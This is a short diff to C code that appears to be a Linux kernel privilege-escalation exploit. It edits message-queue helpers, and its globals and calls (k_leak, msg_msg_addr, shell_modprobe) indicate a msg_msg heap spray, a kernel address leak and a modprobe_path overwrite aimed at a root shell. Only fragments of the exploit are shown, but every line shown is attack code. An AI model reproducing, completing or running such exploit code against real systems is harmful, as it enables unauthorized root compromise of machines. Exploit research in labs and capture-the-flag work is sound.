@@ -208,10 +208,10 @@ static void send_msg(int qid, const void* data, size_t sz)
     int ret;
     uint8_t buf[0x1000];
     msg_t* msg_p = (msg_t*)buf;
-    msg_p->mtype = LONG_MAX;
+    msg_p->mtype = 0x1337;
     memcpy(msg_p->mtext, data, sz);
 
-    ret = msgsnd(qid, (void*)buf, sz, 0);
+    ret = msgsnd(qid, (void*)buf, sz, IPC_NOWAIT);
 
     if (ret < 0) {
         errExit("msgsnd");
@@ -253,7 +253,6 @@ typedef struct {
     size_t offset;
 } chunk_t;
 
-int qid;
 uint64_t k_leak;
 uint64_t random_val;
 uint64_t msg_msg_addr;
@@ -370,7 +369,7 @@ int main(void) {
 
     int ret;
 
-    qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
 
     shell_modprobe();
     
